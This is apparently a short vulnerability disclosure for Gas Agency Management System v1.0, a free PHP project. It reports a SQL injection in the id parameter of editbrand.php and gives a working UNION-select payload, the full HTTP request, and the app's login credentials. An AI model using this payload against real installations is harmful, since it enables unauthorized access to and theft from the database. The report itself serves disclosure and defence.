# Gas Agency Management System v1.0 by mayuri_k has SQL injection

BUG_Author: 白万荣

Login account: mayuri.infospace@gmail.com/admin

vendors: https://www.sourcecodester.com/php/15586/gas-agency-management-system-project-php-free-download-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /gasmark/editbrand.php?id=

Vulnerability location: /gasmark/editbrand.php?id=, id

dbname = gasmark

[+] Payload: /gasmark/editbrand.php?id=-1' union select 1,database(),3,4--+ // Leak place ---> id

```sql
GET /gasmark/editbrand.php?id=-1%27%20union%20select%201,database(),3,4--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=1848l0sacnthbvkk77stfdihkh
Connection: close


```

![image](https://github.com/assets/54017627/93cd5d3f-e890-492a-af6e-edc861d777e6)
